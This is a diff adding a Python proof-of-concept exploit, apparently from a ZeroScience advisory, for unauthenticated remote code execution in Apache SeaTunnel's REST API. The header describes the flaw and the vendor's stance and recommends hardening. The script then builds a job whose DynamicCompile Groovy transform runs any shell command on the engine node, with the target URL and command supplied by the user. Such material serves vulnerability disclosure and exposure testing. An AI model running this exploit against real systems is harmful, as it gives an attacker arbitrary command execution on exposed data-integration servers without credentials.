@@ -1,0 +1,128 @@
+#!/usr/bin/env python
+#
+#
+# Apache SeaTunnel 3.0.0 Remote Code Execution
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://seatunnel.apache.org
+# Affected version: 3.0.0 and 2.3.13
+#
+# Summary: SeaTunnel is a very easy-to-use, ultra-high-performance, distributed
+# data integration platform that supports real-time synchronization of massive data.
+# It can synchronize tens of billions of data stably and efficiently every day,
+# and has been used in production by nearly 100 companies.
+#
+# Desc: Apache SeaTunnel is affected by an unauthenticated remote code execution
+# condition in its engine REST API. The REST API v2 ships with authentication disabled
+# by default (enable-basic-auth defaults to false), so no authentication filter is
+# installed, and the job-submission endpoint POST /submit-job accepts a job configuration
+# that may contain a DynamicCompile transform. That transform compiles the job-supplied
+# source_code through an unsandboxed new GroovyClassLoader().parseClass(...) with no
+# SecureASTCustomizer and executes it on the engine node when the transform schema
+# is resolved. A remote party able to reach the REST port can therefore submit a single
+# job whose Groovy (or Java/Scala) source runs arbitrary commands on the SeaTunnel
+# engine node without any credentials.
+#
+# The Apache SeaTunnel project considers this behaviour by design and declines such
+# reports. Its security model holds that SeaTunnel is a framework that executes user-supplied
+# code unconditionally, that any client able to reach a management interface should be
+# treated as a cluster administrator, and that network isolation is the operator's
+# responsibility; the project's security FAQ states that it has historically rejected
+# numerous remote-code-execution reports on that basis. For that reason no CVE is assigned
+# to this issue.
+#
+# It remains a legitimate insecure-default weakness rather than merely an operator choice:
+# the security-relevant control (authentication) is off in the shipped defaults, and the
+# identical missing-authentication condition was accepted and fixed as CVE-2025-32896
+# on the REST API v1 endpoint one release earlier. The appropriate response is therefore
+# hardening of the defaults - shipping with authentication required (or refusing to bind
+# the REST API without it, or emitting a prominent startup warning), and sandboxing or
+# gating the DynamicCompile transform for remotely submitted jobs - best pursued as a
+# public hardening contribution (pull request) rather than a coordinated CVE.
+#
+# Tested on: Microsoft Windows 10 (x86_64)
+#            Eclipse Temurin OpenJDK 21.0.6 (LTS)
+#
+#
+# Vulnerability discovered by Neurogenesia
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6011
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6011
+#
+#
+# 13.08.2026
+#
+
+
+import urllib.request
+import urllib.error
+import argparse
+import sys
+
+DEFAULT_CMD = "id > /tmp/seatunnel_pwned 2>&1; touch /tmp/seatunnel_pwned_marker"
+
+def hocon_body(cmd):
+    g = cmd.replace("\\", "\\\\").replace("'", "\\'")
+    return (
+        'env { job.mode = "BATCH", parallelism = 1 }\n'
+        'source {\n'
+        '  FakeSource {\n'
+        '    plugin_output = "src"\n'
+        '    row.num = 1\n'
+        '    schema = { fields { name = "string" } }\n'
+        '  }\n'
+        '}\n'
+        'transform {\n'
+        '  DynamicCompile {\n'
+        '    plugin_input = "src"\n'
+        '    plugin_output = "out"\n'
+        '    compile_language = "GROOVY"\n'
+        '    compile_pattern = "SOURCE_CODE"\n'
+        '    source_code = """\n'
+        '      import org.apache.seatunnel.api.table.catalog.*\n'
+        '      import org.apache.seatunnel.api.table.type.*\n'
+        '      import org.apache.seatunnel.api.table.type.SeaTunnelRowAccessor\n'
+        '      Column[] getInlineOutputColumns(CatalogTable inputCatalogTable) {\n'
+        "        ['/bin/sh','-c','" + g + "'].execute().waitFor()\n"
+        '        Column[] columns = new Column[1]\n'
+        '        columns[0] = PhysicalColumn.of("pwn", BasicType.STRING_TYPE, 50L, true, "", "")\n'
+        '        return columns\n'
+        '      }\n'
+        '      Object[] getInlineOutputFieldValues(SeaTunnelRowAccessor inputRow) {\n'
+        '        Object[] v = new Object[1]; v[0] = "pwned"; return v\n'
+        '      }\n'
+        '    """\n'
+        '  }\n'
+        '}\n'
+        'sink { Console { plugin_input = "out" } }\n'
+    )
+
+def main():
+    ap = argparse.ArgumentParser(description="SeaTunnel unauth /submit-job rce trigger")
+    ap.add_argument("target", help="base URL of the SeaTunnel REST API, e.g. http://10.2.5.1:8080")
+    ap.add_argument("--cmd", default=DEFAULT_CMD, help="OS command to run on the engine node")
+    a = ap.parse_args()
+
+    url = a.target.rstrip("/") + "/submit-job?format=hocon&jobName=poc"
+    body = hocon_body(a.cmd).encode("utf-8")
+
+    print(f"[*] POST {url}")
+    print(f"[*] payload command: {a.cmd}")
+    req = urllib.request.Request(url, data=body, method="POST",
+                                 headers={"Content-Type": "text/plain"})
+    try:
+        with urllib.request.urlopen(req, timeout=30) as r:
+            print(f"[*] HTTP {r.status}")
+            print(r.read().decode("utf-8", "replace"))
+    except urllib.error.HTTPError as e:
+        print(f"[*] HTTP {e.code}")
+        print(e.read().decode("utf-8", "replace"))
+    except Exception as e:
+        print(f"[!] request failed: {e}")
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
